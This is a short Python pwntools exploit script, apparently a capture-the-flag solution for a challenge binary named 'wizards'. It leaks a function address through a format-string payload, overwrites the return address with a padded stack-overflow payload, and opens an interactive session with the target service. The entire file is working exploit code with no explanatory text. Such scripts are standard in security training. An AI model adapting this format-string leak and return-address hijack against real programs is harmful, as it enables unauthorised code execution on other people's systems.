#!/usr/bin/env python2
# -*- coding: utf-8 -*-

from pwn import *

context(os='linux', arch='amd64')

BINARY = './wizards'
REMOTE = True

WIN_OFFSET = 0x13f
WIN_RET = 0x42


def leak_win_address(remote):
    remote.recvuntil("Enter your witch name:")
    log.info("Sending format string exploit...")
    remote.sendline("%p|" * 42)

    LEAKS = remote.recvuntil("enter your magic spell:").split("|")
    MAIN = int(LEAKS[-5], 16)
    log.info("Leaked MAIN function address: {}".format(hex(MAIN)))

    WIN = MAIN - WIN_OFFSET
    log.info("Leaked WIN function address: {}".format(hex(WIN)))

    return WIN


def exploit():
    if REMOTE:
        r = remote('127.0.0.1', 1337)
    else:
        r = process(BINARY)

    win_addr = leak_win_address(r)
    win_ret = win_addr + WIN_RET

    payload = "Expelliarmus\x00"
    payload += 'A' * cyclic_find("cnaa")
    payload += p64(win_ret)
    payload += p64(win_addr)

    r.sendline(payload)
    r.interactive()


if __name__ == "__main__":
    exploit()
